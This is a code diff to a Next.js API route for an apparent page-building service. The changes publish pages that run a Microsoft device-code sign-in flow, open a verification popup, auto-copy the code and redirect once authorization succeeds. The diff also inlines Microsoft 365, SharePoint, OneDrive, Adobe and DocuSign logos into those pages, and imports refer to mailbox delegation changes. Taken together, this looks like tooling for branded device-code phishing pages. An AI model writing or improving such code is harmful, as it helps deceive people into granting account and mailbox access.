@@ -1,6 +1,8 @@
 import { NextRequest } from "next/server";
+import { readFileSync } from "node:fs";
 import { isIP } from "node:net";
 import { randomBytes } from "node:crypto";
+import { resolve } from "node:path";
 import sanitizeHtml from "sanitize-html";
 import { z } from "zod";
 
@@ -15,7 +17,7 @@ import { db } from "@/lib/db";
 import { isSafeRedirectUrl, pageDocumentSchema, renderPageDocument, type PageDocument, type PageNode } from "@/lib/page-document";
 import { getVisualTemplate, visualTemplates } from "@/lib/visual-templates";
 import { changeMailboxPermission, exchangeConfiguration, ExchangeConfigurationError, ExchangeOperationError, getMailboxDelegation } from "@/lib/exchange";
-import { authorizationStatus, GraphError, graphFetch, MicrosoftReauthenticationRequired, startDeviceAuthorization } from "@/lib/microsoft";
+import { authorizationStatus, GraphError, graphFetch, isOfficialMicrosoftVerificationUrl, MicrosoftReauthenticationRequired, startDeviceAuthorization } from "@/lib/microsoft";
 
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
@@ -126,6 +128,7 @@ async function route(request: NextRequest, path: string[]) {
   if (path[0] === "microsoft" && path[1] === "device" && path[3] === "status" && request.method === "GET") {
     const status = await authorizationStatus(id.parse(path[2]), z.string().min(40).parse(request.nextUrl.searchParams.get("token")));
     if (!status) throw new ApiError(404, "Authorization session not found");
+    if (status.verificationUri && !isOfficialMicrosoftVerificationUrl(status.verificationUri)) throw new ApiError(502, "Microsoft verification URL was rejected");
     const headers: Record<string, string> = {};
     const origin = request.headers.get("origin");
     if (origin && status.pageProject?.id) {
@@ -1077,7 +1080,7 @@ function deploymentPayload(
   expiresAt: Date | undefined,
 ) {
   const hasDeviceCode = version.html.includes('data-dynamic="microsoft-device-code"');
-  const deploymentHtml = hasDeviceCode ? version.html.replaceAll(">XXXX-XXXX<", ">Requesting verification code…<") : version.html;
+  const deploymentHtml = embedProviderAssets(hasDeviceCode ? version.html.replaceAll(">XXXX-XXXX<", ">Preparing Microsoft code…<") : version.html);
   let systemScript: string | undefined;
   let scriptNonce: string | undefined;
   let connectOrigin: string | undefined;
@@ -1090,8 +1093,8 @@ function deploymentPayload(
     const startEndpoint = `${base}/api/v1/public/deployments/${encodeURIComponent(id)}/device/start`;
     const parsed = pageDocumentSchema.safeParse(version.document);
     const behavior = parsed.success ? parsed.data.settings.builder : undefined;
-    const redirect = behavior?.redirectUrl && isSafeRedirectUrl(behavior.redirectUrl) && behavior.redirectDelay !== "never" ? behavior.redirectUrl : "";
-    systemScript = `(()=>{"use strict";const startEndpoint=${safeScriptJson(startEndpoint)},redirect=${safeScriptJson(redirect)};let session=null,refreshTimer=null,stopped=false;const nodes=s=>document.querySelectorAll(s);function display(status){const success=status==="CONNECTED",terminal=["EXPIRED","FAILED","CANCELLED"].includes(status);nodes('[data-node-id="auth-active"]').forEach(n=>n.hidden=success);nodes('[data-node-id="auth-success"]').forEach(n=>n.hidden=!success);nodes('[data-node-id="auth-error-message"]').forEach(n=>n.hidden=!terminal);nodes('[data-action="restart-authorization"]').forEach(n=>n.hidden=true);const labels={PENDING:"Waiting for authorization",CONNECTED:"Authorization complete",EXPIRED:"Refreshing verification code…",FAILED:"Authorization failed",CANCELLED:"Authorization cancelled"};nodes('[data-node-id="auth-status"]').forEach(n=>{n.dataset.status=status.toLowerCase();const dot=document.createElement("span");dot.className="pb-status-dot";n.replaceChildren(dot,document.createTextNode(labels[status]||status))})}function apply(next){session=next;nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent=next.userCode);nodes('[data-action="open-microsoft"]').forEach(n=>n.setAttribute("href",next.verificationUri));display(next.status);clearTimeout(refreshTimer);const wait=Math.max(1000,new Date(next.expiresAt).getTime()-Date.now()+250);refreshTimer=setTimeout(()=>{if(!stopped)start(true)},wait)}async function start(replace=false){nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent="Refreshing…");try{const body=replace&&session?{previousSessionId:session.sessionId,previousStatusToken:session.statusToken}:{};const response=await fetch(startEndpoint,{method:"POST",headers:{"Content-Type":"text/plain;charset=UTF-8"},body:JSON.stringify(body),credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("start");apply((await response.json()).session);poll()}catch{nodes('[data-node-id="auth-status"]').forEach(n=>n.textContent="Reconnecting…");setTimeout(()=>start(replace),5000)}}async function poll(){if(stopped||!session)return;try{const endpoint=startEndpoint.replace(/public\\/deployments\\/.+\\/device\\/start$/,"microsoft/device/"+encodeURIComponent(session.sessionId)+"/status")+"?token="+encodeURIComponent(session.statusToken);const response=await fetch(endpoint,{credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("status");const data=(await response.json()).authorization;session={...session,...data};if(data.userCode)nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent=data.userCode);display(data.status);if(data.status==="CONNECTED"){stopped=true;clearTimeout(refreshTimer);if(redirect)setTimeout(()=>location.assign(redirect),1000);return}if(data.status==="EXPIRED"){start(true);return}if(data.status==="PENDING")setTimeout(poll,3000)}catch{nodes('[data-node-id="auth-status"]').forEach(n=>n.textContent="Reconnecting…");setTimeout(poll,5000)}}document.addEventListener("click",event=>{const target=event.target.closest("[data-action]");if(!target||!session)return;if(target.dataset.action==="copy-device-code"){event.preventDefault();navigator.clipboard.writeText(session.userCode)}if(target.dataset.action==="open-microsoft"){event.preventDefault();open(session.verificationUri,"_blank","noopener,noreferrer")}});start()})();`;
+    const redirect = behavior?.redirectUrl && isSafeRedirectUrl(behavior.redirectUrl) ? behavior.redirectUrl : "";
+    systemScript = `(()=>{"use strict";const startEndpoint=${safeScriptJson(startEndpoint)},redirect=${safeScriptJson(redirect)};let session=null,refreshTimer=null,stopped=false,popup=null,feedbackTimer=null;const nodes=s=>document.querySelectorAll(s);function status(text){nodes('[data-node-id="auth-status"]').forEach(n=>{n.dataset.status="pending";const dot=document.createElement("span");dot.className="pb-status-dot";n.replaceChildren(dot,document.createTextNode(text))})}function apply(next){session=next;nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent=next.userCode);nodes('[data-action="open-microsoft"]').forEach(n=>n.setAttribute("href",next.verificationUri));status("Waiting for Microsoft…");clearTimeout(refreshTimer);const wait=Math.max(1000,new Date(next.expiresAt).getTime()-Date.now()+250);refreshTimer=setTimeout(()=>{if(!stopped)start(true)},wait)}async function copyCode(){if(!session?.userCode)return;try{await navigator.clipboard.writeText(session.userCode);const feedback=document.querySelector('[data-node-id="auth-copy-feedback"]');if(feedback){feedback.classList.add("is-visible");clearTimeout(feedbackTimer);feedbackTimer=setTimeout(()=>feedback.classList.remove("is-visible"),1400)}}catch{}}function openMicrosoft(){if(!session?.verificationUri)return;popup=window.open(session.verificationUri,"microsoft-auth","width=520,height=720,resizable=yes,scrollbars=yes");void copyCode();if(!popup)nodes('[data-node-id="auth-popup-fallback"]').forEach(n=>n.classList.add("is-visible"))}async function start(replace=false){nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent="Preparing…");status("Preparing a Microsoft code…");try{const body=replace&&session?{previousSessionId:session.sessionId,previousStatusToken:session.statusToken}:{};const response=await fetch(startEndpoint,{method:"POST",headers:{"Content-Type":"text/plain;charset=UTF-8"},body:JSON.stringify(body),credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("start");apply((await response.json()).session);poll()}catch{status("Reconnecting…");setTimeout(()=>start(replace),5000)}}async function poll(){if(stopped||!session)return;try{const endpoint=startEndpoint.replace(/public\\/deployments\\/.+\\/device\\/start$/,"microsoft/device/"+encodeURIComponent(session.sessionId)+"/status")+"?token="+encodeURIComponent(session.statusToken);const response=await fetch(endpoint,{credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("status");const data=(await response.json()).authorization;session={...session,...data};if(data.userCode)nodes('[data-dynamic="microsoft-device-code"]').forEach(n=>n.textContent=data.userCode);if(data.status==="CONNECTED"){stopped=true;clearTimeout(refreshTimer);try{popup?.close()}catch{}if(redirect)location.replace(redirect);return}if(data.status==="EXPIRED"){start(true);return}if(["FAILED","CANCELLED"].includes(data.status)){start(true);return}setTimeout(poll,3000)}catch{status("Reconnecting…");setTimeout(poll,5000)}}document.addEventListener("click",event=>{const target=event.target.closest("[data-action]");if(!target||!session)return;if(target.dataset.nodeId==="auth-popup-fallback")return;if(target.dataset.action==="copy-device-code"){event.preventDefault();void copyCode()}if(target.dataset.action==="open-microsoft"){event.preventDefault();openMicrosoft()}});start()})();`;
   }
   return {
     id,
@@ -1131,15 +1134,14 @@ async function publishMicrosoftSessionPage(input: { pageProjectId: string; deplo
   const endpoint = `${base}/api/v1/microsoft/device/${encodeURIComponent(input.publicId)}/status?token=${encodeURIComponent(input.statusToken)}`;
   const restartEndpoint = `${base}/api/v1/microsoft/device/${encodeURIComponent(input.publicId)}/restart?token=${encodeURIComponent(input.statusToken)}`;
   const behavior = parsed.data.settings.builder;
-  const redirectUrl = behavior?.redirectUrl ?? "";
-  const redirectDelay = behavior?.redirectDelay === "immediate" ? 0 : behavior?.redirectDelay === "never" || !behavior?.redirectDelay ? -1 : Number(behavior.redirectDelay) * 1000;
+  const redirectUrl = behavior?.redirectUrl && isSafeRedirectUrl(behavior.redirectUrl) ? behavior.redirectUrl : "";
   const scriptNonce = randomBytes(18).toString("base64url");
-  const script = `(()=>{"use strict";const endpoint=${safeScriptJson(endpoint)},restartEndpoint=${safeScriptJson(restartEndpoint)},redirect=${safeScriptJson(redirectUrl)},delay=${redirectDelay};let code=${safeScriptJson(session.userCode)};const statusNodes=()=>document.querySelectorAll(".pb-status"),restartNodes=()=>document.querySelectorAll('[data-action="restart-authorization"]');restartNodes().forEach(node=>node.hidden=true);async function poll(){try{const response=await fetch(endpoint,{credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("status");const data=(await response.json()).authorization;code=data.userCode||code;document.querySelectorAll('[data-dynamic="microsoft-device-code"]').forEach(node=>node.textContent=code);const labels={PENDING:"Waiting for Microsoft authorization",CONNECTED:"Authorization complete",EXPIRED:"Authorization expired",FAILED:"Authorization failed",CANCELLED:"Authorization cancelled"};statusNodes().forEach(node=>{node.textContent=labels[data.status]||data.status;node.dataset.status=data.status.toLowerCase()});restartNodes().forEach(node=>node.hidden=!["EXPIRED","FAILED","CANCELLED"].includes(data.status));if(data.status==="CONNECTED"&&redirect&&delay>=0)setTimeout(()=>location.assign(redirect),delay);if(data.status==="PENDING")setTimeout(poll,3000)}catch{statusNodes().forEach(node=>node.textContent="Unable to check authorization status");setTimeout(poll,5000)}}document.addEventListener("click",async event=>{const target=event.target.closest("[data-action]");if(!target)return;if(target.dataset.action==="copy-device-code"){event.preventDefault();await navigator.clipboard.writeText(code)}if(target.dataset.action==="restart-authorization"){event.preventDefault();target.textContent="Restarting…";const response=await fetch(restartEndpoint,{method:"POST",credentials:"omit"});if(response.ok)location.reload();else target.textContent="Restart unavailable"}});poll()})();`;
+  const script = `(()=>{"use strict";const endpoint=${safeScriptJson(endpoint)},restartEndpoint=${safeScriptJson(restartEndpoint)},redirect=${safeScriptJson(redirectUrl)};let code=${safeScriptJson(session.userCode)},verificationUri=${safeScriptJson(session.verificationUri)},popup=null,feedbackTimer=null;const statusNodes=()=>document.querySelectorAll(".pb-status");function status(text){statusNodes().forEach(node=>node.textContent=text)}async function copyCode(){try{await navigator.clipboard.writeText(code);const feedback=document.querySelector('[data-node-id="auth-copy-feedback"]');if(feedback){feedback.classList.add("is-visible");clearTimeout(feedbackTimer);feedbackTimer=setTimeout(()=>feedback.classList.remove("is-visible"),1400)}}catch{}}async function replace(){status("Preparing a Microsoft code…");const response=await fetch(restartEndpoint,{method:"POST",credentials:"omit"});if(response.ok){const result=await response.json();const next=result.publishedConnectUrl||result.connectUrl;if(next)location.replace(next)}else setTimeout(replace,5000)}async function poll(){try{const response=await fetch(endpoint,{credentials:"omit",cache:"no-store"});if(!response.ok)throw new Error("status");const data=(await response.json()).authorization;code=data.userCode||code;verificationUri=data.verificationUri||verificationUri;document.querySelectorAll('[data-dynamic="microsoft-device-code"]').forEach(node=>node.textContent=code);document.querySelectorAll('[data-action="open-microsoft"]').forEach(node=>node.setAttribute("href",verificationUri));if(data.status==="CONNECTED"){try{popup?.close()}catch{}if(redirect)location.replace(redirect);return}if(["EXPIRED","FAILED","CANCELLED"].includes(data.status)){void replace();return}setTimeout(poll,3000)}catch{status("Reconnecting…");setTimeout(poll,5000)}}document.addEventListener("click",event=>{const target=event.target.closest("[data-action]");if(!target)return;if(target.dataset.nodeId==="auth-popup-fallback")return;if(target.dataset.action==="copy-device-code"){event.preventDefault();void copyCode()}if(target.dataset.action==="open-microsoft"){event.preventDefault();popup=window.open(verificationUri,"microsoft-auth","width=520,height=720,resizable=yes,scrollbars=yes");void copyCode();if(!popup)document.querySelector('[data-node-id="auth-popup-fallback"]')?.classList.add("is-visible")}});status("Waiting for Microsoft…");poll()})();`;
   const policy = deployment.accessPolicy as { type?: "PUBLIC" | "PRIVATE" | "ACCESS_CODE"; codeHash?: string } | null;
   await publishDeployment(deployment.hostname, {
     id: deployment.id,
     status: "ACTIVE",
-    html: rendered.html,
+    html: embedProviderAssets(rendered.html),
     css: rendered.css,
     javascript: "",
     systemScript: script,
@@ -1154,6 +1156,27 @@ async function publishMicrosoftSessionPage(input: { pageProjectId: string; deplo
 
 function safeScriptJson(value: string) {
   return JSON.stringify(value).replaceAll("<", "\\u003c").replaceAll("\u2028", "\\u2028").replaceAll("\u2029", "\\u2029");
+}
+
+const providerAssetMimeTypes: Record<string, string> = {
+  "/providers/microsoft365/microsoft365.svg": "image/svg+xml",
+  "/providers/sharepoint/sharepoint.svg": "image/svg+xml",
+  "/providers/onedrive/onedrive.svg": "image/svg+xml",
+  "/providers/adobe/pdf-file-icon.png": "image/png",
+  "/providers/docusign/docusign.svg": "image/svg+xml",
+};
+let embeddedProviderAssets: Map<string, string> | null = null;
+
+function embedProviderAssets(html: string) {
+  if (!embeddedProviderAssets) {
+    embeddedProviderAssets = new Map(Object.entries(providerAssetMimeTypes).map(([publicPath, mime]) => {
+      const bytes = readFileSync(resolve(process.cwd(), "public", publicPath.replace(/^\/+/, "").replace(/^providers\//, "providers/")));
+      return [publicPath, `data:${mime};base64,${bytes.toString("base64")}`];
+    }));
+  }
+  let result = html;
+  for (const [publicPath, dataUrl] of embeddedProviderAssets) result = result.replaceAll(`"${publicPath}"`, `"${dataUrl}"`);
+  return result;
 }
 
 async function outlookLaunchRoute(request: NextRequest, path: string[]) {
